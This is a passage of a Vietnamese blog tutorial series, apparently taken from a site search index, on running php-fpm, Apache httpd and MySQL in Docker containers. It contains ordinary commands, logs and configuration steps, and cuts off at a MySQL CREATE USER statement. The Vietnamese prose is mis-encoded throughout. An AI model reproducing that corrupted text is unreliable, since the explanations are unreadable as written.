connections TrÆ°á»ng há»£p log quÃ¡ dÃ i, ta cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh sá»‘ dÃ²ng kiá»ƒm tra báº±ng cÃ¡ch thÃªm option --tail so_dong\n1 2 3 4 5 6 7 8 9 10 11 â¯ docker logs --tail 10 c-php [11-Jun-2021 11:20:00] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:27:42] NOTICE: Finishing ... [11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye! [14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1 [14-Jun-2021 02:55:15] NOTICE: ready to handle connections Äá»ƒ kiá»ƒm tra log theo thá»i gian thá»±c khi docker Ä‘ang cháº¡y, ta thÃªm tÃ¹y chá»n -f vÃ o:\n1 docker logs -f container_name/id docker stats Khi container Ä‘ang cháº¡y, nÃ³ cÃ³ sá»­ dá»¥ng cÃ¡c tÃ i nguyÃªn cá»§a há»‡ thá»‘ng, Ä‘á»ƒ giÃ¡m sÃ¡t má»©c Ä‘á»™ sá»­ dá»¥ng tÃ i nguyÃªn, ta sá»­ dá»¥ng cÃº phÃ¡p:\n1 docker stats container_name/id khi dÃ¹ng\n1 docker stats máº·c Ä‘á»‹nh, nÃ³ sáº½ giÃ¡m sÃ¡t toÃ n bá»™ container Ä‘ang cháº¡y trÃªn há»‡ thá»‘ng\nProcess docker top 1 docker top docker_name/id DÃ¹ng Ä‘á»ƒ xem thÃ´ng tin vá» tiáº¿n trÃ¬nh (process) cá»§a docker, bao gá»“m PID (process Id) vÃ  PPID (Parent Process Id).\nChÃºng ta cÃ²n cÃ³ thá»ƒ xem thÃ´ng tin vá» cÃ¡c tiáº¿n trÃ¬nh á»Ÿ dáº¡ng cÃ¢y:\n1 pstree -c -p -A $(pgrep dockerd) ","description":"Tra cá»©u thÃ´ng tin Image, Container vÃ  giÃ¡m sÃ¡t hoáº¡t Ä‘á»™ng container Docker","id":19,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P5)","uri":"https://minhlongmt183.github.io/posts/docker_p5/"},{"content":"\rToÃ n bá»™ series nÃ y Ä‘Æ°á»£c tham kháº£o tá»« hai nguá»“n chÃ­nh: XuanThuLabChanel vÃ  DockerDoc. Em xin chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a cÃ¡c tÃ¡c giáº£ cá»§a nhá»¯ng kÃªnh nÃ³i trÃªn.â¤ï¸â¤ï¸â¤ï¸\rCÃ i Ä‘áº·t, táº¡o vÃ  cháº¡y PHP, phiÃªn báº£n cÃ³ PHP-FPM báº±ng Docker pull phiÃªn báº£n image php-fpm tá»« docker hub ChÃºng ta táº£i báº£n 7.3-fpm tá»« docker hub. fpm á»Ÿ Ä‘Ã¢y cÃ³ nghÄ©a lÃ  trong gÃ³i nÃ y, cÃ³ thÃªm dá»‹ch vá»¥ php-fpm. Dá»‹ch vá»¥ nÃ y láº¯ng nghe vÃ  táº¡o ra nhiá»u tiáº¿n trÃ¬nh php trÃªn cá»•ng 9000 chá» cÃ¡c webserver nhÆ° http, nginx káº¿t ná»‘i vÃ o.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 â¯ docker pull php:7.3-fpm 7.3-fpm: Pulling from library/php 69692152171a: Pull complete 2040822db325: Pull complete 9b4ca5ae9dfa: Pull complete ac1fe7c6d966: Pull complete c342d9e76a3c: Pull complete 6ead8e46ae7b: Pull complete 5c98df0d7626: Pull complete dd302d19deb7: Pull complete 7701b71427d2: Pull complete 672353cf3439: Pull complete b379e47d0c20: Pull complete Digest: sha256:d38892103d2f76e3245a080875718d74414d6d7a57cfe7000a91f4aa668f870b Status: Downloaded newer image for php:7.3-fpm â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Táº¡o máº¡ng bridge Äáº§u tiÃªn chÃºng ta táº¡o má»™t bride network cÃ³ tÃªn lÃ  www-net\n1 2 3 4 5 6 7 8 â¯ docker network create --driver bridge www-net 4d9c8d81da85fd9118cea666265aab88ae6ab71ac1d53a2dd81b168d87c9d290 â¯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local 4d9c8d81da85 www-net bridge local Táº¡o thÆ° má»¥c chia sáº» dá»¯ liá»‡u giá»¯a mÃ¡y host vÃ  container TrÃªn mÃ¡y host, ta xÃ¢y dá»±ng má»™t cÃ¢y thÆ° má»¥c Ä‘á»ƒ lÆ°u trá»¯ dá»¯ liá»‡u chia sáº» vá»›i container nhÆ° sau:\n1 2 3 4 5 6 7 . â”œâ”€â”€ docker â”‚Â â””â”€â”€ data â”‚Â â”œâ”€â”€ c1.txt â”‚Â â”œâ”€â”€ data_container2.txt â”‚Â â”œâ”€â”€ d.txt â”‚Â â””â”€â”€ www Vá» kiáº¿n thá»©c liÃªn quan vá» chia sáº» dá»¯ liá»‡u giá»¯a mÃ¡y host vÃ  container, báº¡n cÃ³ thá»ƒ xem kÄ© hÆ¡n á»Ÿ pháº§n 2\nCháº¡y container php-fpm ChÃºng ta táº¡o má»™t container cÃ³ tÃªn lÃ  c-php\n1 2 3 4 5 â¯ docker run -d --name c-php -v /home/edisc/Desktop/docker/data:/home/SharedData --network www-net php:7.3-fpm 2894c033c93f5e4f2b02198afbb94cc9b5e62467b2e4c1291a7c2444f30659a7 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2894c033c93f php:7.3-fpm \u0026#34;docker-php-entrypoiâ€¦\u0026#34; 2 minutes ago Up 2 minutes 9000/tcp c-php á» Ä‘Ã¢y, vÃ¬ sau khi táº¡o chÃºng ta khÃ´ng muá»‘n vÃ o trá»±c tiá»‡p docker nÃªn khÃ´ng dÃ¹ng tÃ¹y chá»n -it, tuy nhiÃªn thÃªm lá»‡nh -d Ä‘á»ƒ sau khi táº¡o docker tiáº¿p tá»¥c cháº¡y ná»n. á» Ä‘Ã¢y, tÃ´i dÃ¹ng linux nÃªn quÃ¡ trÃ¬nh diá»…n ra khÃ¡ thuáº­n lá»£i, nhÆ°ng theo tÃ¡c giáº£ thÃ¬ náº¿u báº¡n dÃ¹ng Windows hay MacOs thÃ¬ cáº§n pháº£i thiáº¿t láº­p thÆ° má»¥c á»Ÿ cháº¿ Ä‘á»™ share vá»›i docker thÃ¬ má»›i cÃ³ thá»ƒ táº¡o Ä‘Æ°á»£c. Chi tiáº¿t báº¡n cÃ³ thá»ƒ vÃ o kÃªnh cá»§a anh XuanThuLabChanel Ä‘á»ƒ xem rÃµ hÆ¡n. BÃªn cáº¡nh Ä‘Ã³, ta cÅ©ng tháº¥y container má»›i Ä‘Æ°á»£c táº¡o nÃ y cháº¡y Ä‘ang cháº¡y lá»‡nh \u0026ldquo;docker-php-entrypoiâ€¦\u0026rdquo;, báº£n cháº¥t lá»‡nh nÃ y dÃ¹ng Ä‘á»ƒ gá»i dá»‹ch vá»¥ php-fpm Ä‘á»ƒ cháº¡y vÃ  láº¯ng nghe á»Ÿ cá»•ng 9000.\nKiá»ƒm tra php ChÃºng ta vÃ o container vá»«a má»›i táº¡o, Ã´n láº¡i kiáº¿n thá»©c cÅ©, thay vÃ¬ vÃ o container báº±ng lá»‡nh docker attach ta cÃ²n cÃ³ má»™t cÃ¡ch khÃ¡c Ä‘Ã³ lÃ  thá»±c thi cÃ¢u lá»‡nh bash trong container tá»« host thÃ´ng qua docker exec\n1 2 â¯ docker exec -it c-php bash root@2894c033c93f:/var/www/html# Ta vÃ o thÆ° má»¥c chia sáº» /home/SharedData/ Ä‘á»ƒ kiá»ƒm tra dá»¯ liá»‡u trÃªn thÆ° má»¥c\n1 2 3 4 root@2894c033c93f:/var/www/html# cd /home/SharedData/ root@2894c033c93f:/home/SharedData# ls c1.txt\td.txt data_container2.txt www root@2894c033c93f:/home/SharedData# TrÃªn mÃ¡y host, ta táº¡o file test.php trong thÆ° má»¥c www vÃ  dá»… tháº¥y nÃ³ cÅ©ng hiá»‡n á»Ÿ trong container.\nTiáº¿n hÃ nh cháº¡y lá»‡nh file test.php:\nTa Ä‘Ã£ cháº¡y Ä‘Æ°á»£c php, php trÃªn container lÃ  phiÃªn báº£n PHP 7.3.28\n1 2 3 4 root@2894c033c93f:/home/SharedData/www# php --version PHP 7.3.28 (cli) (built: May 12 2021 13:46:47) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.28, Copyright (c) 1998-2018 Zend Technologies CÃ i Ä‘áº·t, cháº¡y Apache HTTPD báº±ng Docker Táº£i image Apache httpd ChÃºng ta Ä‘Ã£ cÃ i conatiner c-php, tiáº¿p theo cÃ i mÃ¡y chá»§ httpd. ChÃºng ta táº£i image httpd phiÃªn báº£n má»›i nháº¥t vá» vá»›i cÃ¢u lá»‡nh quen thuá»™c:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 â¯ docker pull httpd Using default tag: latest latest: Pulling from library/httpd 69692152171a: Already exists 7284b4e0cc7b: Pull complete 3678b2d55ccd: Pull complete aeb67982a725: Pull complete 06954f8169fd: Pull complete Digest: sha256:48bae0ac5d0d75168f1c1282c0eb21b43302cb1b5c5dc9fa3b4a758ccfb36fe9 Status: Downloaded newer image for httpd:latest â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB httpd latest 39c2d1c93266 2 weeks ago 138MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Láº¥y cáº¥u hÃ¬nh httpd.conf Khi htppd cháº¡y, nÃ³ sáº½ náº¡p file cáº¥u hÃ¬nh trong Ä‘Æ°á»ng dáº«n á»Ÿ container: /usr/local/apache2/conf/httpd.conf. Do Ä‘Ã³, Ä‘Ã¢y cÅ©ng lÃ  nÆ¡i Ä‘á»ƒ chÃºng ta muá»‘n cáº¥u hÃ¬nh tÃ¹y chá»‰nh theo Ã½ muá»‘n cá»§a mÃ¬nh.\nÄáº§u tiÃªn, ta sáº½ cháº¡y táº¡m thá»i container httpd Ä‘á»ƒ trÃ­ch xuáº¥t file cáº¥u hÃ¬nh httpd.conf ra mÃ¡y host trÆ°á»›c.\n1 â¯ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData httpd cp /usr/local/apache2/conf/httpd.conf /home/SharedData/ VÃ¬ chÃºng ta cháº¡y container nÃ y má»™t láº§n Ä‘á»ƒ trÃ­ch xuáº¥t file httpd.conf nÃªn ta thÃªm tÃ¹y chá»n --rm Ä‘á»ƒ docker sáº½ tá»± Ä‘á»™ng xÃ³a sau khi cháº¡y, bÃªn cáº¡nh Ä‘Ã³, khi cháº¡y container ta cÅ©ng thá»±c hiá»‡n luÃ´n cÃ¢u lá»‡nh copy file httpd.conf Ä‘áº¿n thÆ° má»¥c chia sáº» dá»¯ liá»‡u cá»§a mÃ¬nh. Sau khi cháº¡y lá»‡nh trÃªn, chÃºng ta Ä‘Ã£ cÃ³ file httpd.conf trÃªn thÆ° má»¥c data á»Ÿ host.\n1 2 â¯ ls c1.txt data_container2.txt d.txt httpd.conf www Cáº¥u hÃ¬nh httpd.conf Sau khi cÃ³ Ä‘Æ°á»£c file httpd.conf, ta má»Ÿ ra vÃ  tiáº¿n hÃ nh cáº¥u hÃ¬nh.\nMÃ¡y chá»§ apache Ä‘Æ°á»£c táº¡o ra sáº½ táº¡o nhá»¯ng file php thÃ´ng qua proxy, tá»©c lÃ  khi ta truy váº¥n Ä‘áº¿n nhá»¯ng file cÃ³ pháº§n má»Ÿ rá»™ng lÃ  .php apache sáº½ yÃªu cáº§u server cháº¡y php-fpm Ä‘á»ƒ thi hÃ nh file php Ä‘Ã³. Äá»ƒ sá»­ dá»¥ng proxy cho apache, ta cáº§n pháº£i náº¡p cÃ¡c module vá» proxy cá»¥ thá»ƒ :\nBáº­t má»™t sá»‘ module sau trong file httpd.conf: module mod_proxy.so vÃ  mod_proxy_fcgi.so\nThÃªm AddHandler ThÃªm AddHandler Ä‘á»ƒ chá»‰ thá»‹ apache cháº¡y php thÃ´ng qua proxy. Ta thÃªm dÃ²ng lá»‡nh sau vÃ o cuá»‘i file:\n1 AddHandler \u0026#34;proxy:fcgi://ip:9000\u0026#34; .php trÆ°á»ng há»£p nÃ y, ta truy váº¥n Ä‘á»ƒ container c-php nÃªn á»Ÿ ip ta thay thÃ nh c-php vÃ  cá»•ng váº«n lÃ  9000\nThiáº¿t láº­p thÆ° má»¥c máº·c Ä‘á»‹nh cá»§a apache Äá»ƒ thiáº¿t láº­p thÆ° má»¥c máº·c Ä‘á»‹nh khi chÃºng ta share, chÃºng ta sáº½ thay Ä‘á»•i á»Ÿ\n1 2 DocumentRoot \u0026#34;/usr/local/apache2/htdocs\u0026#34; \u0026lt;Directory \u0026#34;/usr/local/apache2/htdocs\u0026#34;\u0026gt; Thay Ä‘á»•i thÃ nh thÆ° má»¥c mÃ  chÃºng ta muá»‘n mount vÃ o.\nCháº¡y mÃ¡y chá»§ Http Apache Ta cháº¡y cÃ¢u lá»‡nh:\n1 docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd á» Ä‘Ã¢y:\nTa cháº¡y má»™t container cÃ³ tÃªn lÃ  c-httpd vá»›i hostname lÃ  httpd káº¿t ná»‘i máº¡ng www-net. Ãnh xáº¡ cá»•ng 80, 443 cá»§a container láº§n lÆ°á»£t lÃªn cá»•ng 9999, 443 cá»§a mÃ¡y host. ThÆ° má»¥c chia sáº» dá»¯ liá»‡u /home/edisc/Desktop/docker/data trÃªn mÃ¡y host Ä‘Æ°á»£c Ã¡nh xáº¡ lÃªn /home/SharedData trÃªn container, vÃ  file cáº¥u hÃ¬nh httpd.conf cÅ©ng Ä‘Æ°á»£c Ã¡nh xáº¡ vÃ o /usr/local/apache2/conf/httpd.conf.\ná» Ä‘Ã¢y lÆ°u Ã½, kháº£ nÄƒng chÃºng ta sáº½ bá»‹ lá»—i 1 2 docker: Error response from daemon: driver failed programming external connectivity on endpoint c-httpd (e0fa76873fc8a5b1b73a0e9589774a25d7a7c377a777d3af6c5313bf7c44adc7): Error starting userland proxy: listen tcp 0.0.0.0:443: bind: address already in use. ERRO[0000] error waiting for container: context canceled Tá»©c lÃ  cá»•ng mÃ  chÃºng ta Ã¡nh xáº¡ trÃªn mÃ¡y host Ä‘Ã£ Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi má»™t tiáº¿n trÃ¬nh nÃ o Ä‘Ã³. LÃºc bÃ¢y giá» cÃ³ 2 cÃ¡ch giáº£i quyáº¿t:\nChá»n cá»•ng khÃ¡c trÃªn mÃ¡y host TÃ¬m cÃ¡c á»©ng dá»¥ng sá»­ dá»¥ng cá»•ng nÃ y rá»“i kill nÃ³ Ä‘i. Äá»ƒ tÃ¬m cÃ¡c cá»•ng sá»­ dá»¥ng ta dÃ¹ng lá»‡nh sudo netstat -pna | grep 443 vá»›i 443 lÃ  port mÃ¬nh cáº§n tÃ¬m.\nTa Ä‘Æ°á»£c káº¿t quáº£. 1 2 3 4 5 6 7 â¯ docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd [Thu Jun 10 08:10:54.751670 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly. AH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message [Thu Jun 10 08:10:54.767249 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly. AH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message [Thu Jun 10 08:10:54.771929 2021] [mpm_event:notice] [pid 1:tid 139955972379776] AH00489: Apache/2.4.48 (Unix) configured -- resuming normal operations [Thu Jun 10 08:10:54.772004 2021] [core:notice] [pid 1:tid 139955972379776] AH00094: Command line: \u0026#39;httpd -D FOREGROUND\u0026#39; Kiá»ƒm tra apache NhÆ° váº­y á»Ÿ bÆ°á»›c trÃªn mÃ¡y chá»§ apache cá»§a chÃºng ta Ä‘Ã£ cháº¡y. Äá»ƒ kiá»ƒm tra, ta tiáº¿n hÃ nh má»Ÿ trÃ¬nh duyá»‡t 127.0.0.1:9999 hoáº·c localhost:9999\nNhÆ° váº­y, mÃ¡y chá»§ apache Ä‘Ã£ hoáº¡t Ä‘á»™ng hiá»‡u quáº£. ChÃºng ta gá»i file php Ä‘á»ƒ xem proxy cÃ³ hoáº¡t Ä‘á»™ng khÃ´ng\nNhÆ° váº­y, proxy Ä‘Ã£ gá»i Ä‘Æ°á»£c test.php.\nCÃ i Ä‘áº·t, cháº¡y MySQL báº±ng Docker Trong 2 pháº§n trÆ°á»›c, chÃºng ta Ä‘Ã£ táº¡o Ä‘Æ°á»£c 2 container, má»™t container cháº¡y php vÃ  má»™t container cháº¡y server apache httpd. Pháº§n nÃ y chÃºng ta sáº½ tiáº¿n hÃ nh cÃ i Ä‘áº·t vÃ  cháº¡y MySQL báº±ng Docker.\nThiáº¿t láº­p biáº¿n mÃ´i trÆ°á»ng cho container Docker cho phÃ©p chÃºng ta thiáº¿t láº­p cÃ¡c biáº¿n mÃ´i trÆ°á»ng cho container thÃ´ng qua tÃ¹y chá»n -e. VÃ­ dá»¥, ta cháº¡y má»™t container tá»« image busybox, trong Ä‘Ã³, thiáº¿t láº­p cÃ¡c biáº¿n mÃ´i trÆ°á»ng cho container:\n1 2 3 4 5 6 â¯ docker run -it --rm -e BIEN1=VALUE1 -e BIEN2=\u0026#34;VALUE2\u0026#34; busybox / # echo $BIEN1 VALUE1 / # echo $BIEN2 VALUE2 / # ÄÃ¢y lÃ  cÃ¡ch thá»©c nhiá»u image Ä‘Ã³ng gÃ³i vÃ  thiáº¿t láº­p biáº¿n mÃ´i trÆ°á»ng giÃºp chÃºng ta thiáº¿t láº­p cÃ¡c container khi cháº¡y.\nTáº£i vá» phiÃªn báº£n mysql ChÃºng ta táº£i phiÃªn báº£n má»›i nhÃ¢t cá»§a mysql báº±ng lá»‡nh docker pull\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 â¯ docker pull mysql Using default tag: latest latest: Pulling from library/mysql 69692152171a: Already exists 1651b0be3df3: Pull complete 951da7386bc8: Pull complete 0f86c95aa242: Pull complete 37ba2d8bd4fe: Pull complete 6d278bb05e94: Pull complete 497efbd93a3e: Pull complete f7fddf10c2c2: Pull complete 16415d159dfb: Pull complete 0e530ffc6b73: Pull complete b0a4a1a77178: Pull complete cd90f92aa9ef: Pull complete Digest: sha256:d50098d7fcb25b1fcb24e2d3247cae3fc55815d64fec640dc395840f8fa80969 Status: Downloaded newer image for mysql:latest â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB httpd latest 39c2d1c93266 2 weeks ago 138MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB mysql latest c0cdc95609f1 4 weeks ago 556MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Má»™t sá»‘ thÃ´ng tin chÃ­nh cáº§n chÃº Ã½ trÆ°á»›c khi báº¯t Ä‘áº§u lÃ m viá»‡c vá»›i mysql:\nport: 3384 MYSQL 8.0 cÃ³ thá»ƒ cÃ³ má»™t sá»‘ mÃ¡y cÅ© khÃ´ng há»— trá»£, cÃ³ thá»ƒ cáº§n cáº¥u hÃ¬nh Ä‘á»ƒ há»‡ thá»‘ng cÅ© cÃ³ thá»ƒ login vÃ o mysql nÃ y. khi Ä‘Ã³ ta thÃªm vÃ o file config ná»™i dung sau: [mysqld]\rdefault-authentication-plugin=mysql_native_password file config: /etc/mysql/my.cnf cá»§a container Biáº¿n mÃ´i trÆ°á»ng: TÃ i khoáº£n root:MYSQL_ROOT_PASSWORD database: /var/lib/mysql Láº¥y file cáº¥u hÃ¬nh my.cnf ChÃºng ta cháº¡y file mysql vÃ  trÃ­ch xuáº¥t file my.cnf ra.\n1 2 3 â¯ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData mysql cp /etc/mysql/my.cnf /home/SharedData/ â¯ ls c1.txt data_container2.txt d.txt httpd.conf my.cnf www Cáº¥u hÃ¬nh file my.cnf Ta thÃªm dÃ²ng lá»‡nh 1 default-authentication-plugin=mysql_native_password vÃ o cuá»‘i file my.cnf\nTáº¡o thÃªm thÆ° má»¥c db trong folder /home/edisc/Desktop/docker/data Ä‘á»ƒ lÆ°u trá»¯ dá»¯ liá»‡u, Ä‘á»“ng thá»i khi xÃ³a container Ä‘i thÃ¬ csdl cá»§a nÃ³ cÅ©ng khÃ´ng bá»‹ máº¥t Ä‘i. Táº¡o container mysql ChÃºng ta táº¡o docker Ä‘á»ƒ cháº¡y mysql, trong Ä‘Ã³:\nThiáº¿t láº­p biáº¿n mÃ´i trÆ°á»ng Ä‘á»ƒ lÆ°u máº­t kháº©u cho tÃ i khoáº£n root, máº­t kháº©u ta chá»n lÃ  docker123:\n-e MYSQL_ROOT_PASSWORD=docker123, Ãnh xáº¡ file cáº¥u hÃ¬nh my.cnf lÃªn thá»±c má»¥c cáº¥u hÃ¬nh trÃªn container:\n-v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf, Ãnh xáº¡ thÆ° má»¥c db trÃªn host lÃªn thÆ° má»¥c lÆ°u trá»¯ databse máº·c Ä‘á»‹nh cá»§a container:\n-v /home/edisc/Desktop/docker/data/db:/var/lib/mysql TÃªn lÃ  c-mysql: --name c-mysql 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 â¯ docker run -e MYSQL_ROOT_PASSWORD=docker123 -v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf -v /home/edisc/Desktop/docker/data/db:/var/lib/mysql --name c-mysql mysql 2021-06-10 09:02:24+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started. 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Switching to dedicated user \u0026#39;mysql\u0026#39; 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started. 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Initializing database files 2021-06-10T09:02:25.233559Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.25) initializing of server in progress as process 43 2021-06-10T09:02:25.244471Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-06-10T09:02:26.680645Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-06-10T09:02:29.942913Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option. 2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Database files initialized 2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Starting temporary server 2021-06-10T09:02:39.196368Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.25) starting as process 88 2021-06-10T09:02:39.243106Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-06-10T09:02:39.910377Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-06-10T09:02:40.126089Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Socket: /var/run/mysqld/mysqlx.sock 2021-06-10T09:02:40.376702Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed. 2021-06-10T09:02:40.377098Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel. ... ChÃºng ta khÃ´ng thiáº¿t láº­p tham sá»‘ Ã¡nh xáº¡ cá»•ng vÃ¬ á»Ÿ Ä‘Ã¢y chÆ°a cÃ³ nhu cáº§u truy cáº­p tá»« bÃªn ngoÃ i vÃ o csdl c-mysql mÃ  csdl nÃ y chá»‰ Ä‘á»ƒ cho c-php vÃ  c-httpd truy cáº­p thÃ´ng qua cá»•ng 3306. Trong thá»±c táº¿, chÃºng ta muá»‘n truy cáº­p tá»« xa, Ä‘á»ƒ cÃ¡c server káº¿t ná»‘i vá»›i nhau, ta cáº§n Ã¡nh xáº¡ cá»•ng 3306 nÃ y tá»›i mÃ¡y host.\nThi hÃ nh má»™t sá»‘ lá»‡nh trong container c-mysql Äáº¿n Ä‘Ã¢y, chÃºng ta Ä‘Ã£ thiáº¿t láº­p Ä‘Æ°á»£c má»™t container cháº¡y mysql, tiáº¿p theo chÃºng ta vÃ o container trÃªn Ä‘á»ƒ cháº¡y má»™t sá»‘ cÃ¢u lá»‡nh Ä‘á»ƒ kiá»ƒm tra.\nVÃ o container c-mysql Äáº§u tiÃªn, vÃ o container c-mysql báº±ng lá»‡nh docker exec:\n1 2 3 4 5 6 7 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 10c415b14dbe mysql \u0026#34;docker-entrypoint.sâ€¦\u0026#34; 5 minutes ago Up 5 minutes 3306/tcp, 33060/tcp c-mysql 7e8910d1b55c php:7.3-fpm \u0026#34;docker-php-entrypoiâ€¦\u0026#34; 43 minutes ago Up 43 minutes 9000/tcp c-php a9d05fe2fc94 httpd \u0026#34;httpd-foreground\u0026#34; About an hour ago Up 34 minutes 0.0.0.0:443-\u0026gt;443/tcp, 0.0.0.0:9999-\u0026gt;80/tcp c-httpd â¯ docker exec -it c-mysql bash root@10c415b14dbe:/# Káº¿t ná»‘i vá»›i mysql mysql cá»§a chÃºng ta cÃ³ username lÃ  root vÃ  cÃ³ password lÃ  docker123 (thiáº¿t láº­p á»Ÿ trÃªn). Tham sá»‘ -pdocker123 giÃºp chÃºng ta khÃ´ng cáº§n pháº£i nháº­p láº¡i password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@10c415b14dbe:/# mysql -u root -pdocker123 mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 8 Server version: 8.0.25 MySQL Community Server - GPL Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; NhÆ° váº­y chÃºng ta Ä‘Ã£ káº¿t ná»‘i Ä‘Æ°á»£c mysql vÃ  vÃ o bÃªn trong cá»§a sql-server.\nKiá»ƒm tra cÃ³ nhá»¯ng database nÃ o trong mysql 1 2 3 4 5 6 7 8 9 10 11 mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.00 sec) mysql\u0026gt; Sá»­ dá»¥ng database mysql 1 2 3 4 5 6 mysql\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; Show table 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 mysql\u0026gt; show tables; +------------------------------------------------------+ | Tables_in_mysql | +------------------------------------------------------+ | columns_priv | | component | | db | | default_roles | | engine_cost | | func | | general_log | | global_grants | | gtid_executed | | help_category | | help_keyword | | help_relation | | help_topic | | innodb_index_stats | | innodb_table_stats | | password_history | | plugin | | procs_priv | | proxies_priv | | replication_asynchronous_connection_failover | | replication_asynchronous_connection_failover_managed | | role_edges | | server_cost | | servers | | slave_master_info | | slave_relay_log_info | | slave_worker_info | | slow_log | | tables_priv | | time_zone | | time_zone_leap_second | | time_zone_name | | time_zone_transition | | time_zone_transition_type | | user | +------------------------------------------------------+ 35 rows in set (0.00 sec) mysql\u0026gt; Táº¡o dá»¯ liá»‡u 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 mysql\u0026gt; CREATE USER \u0026#39;testuser\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;testpass\u0026#39;; Query OK, 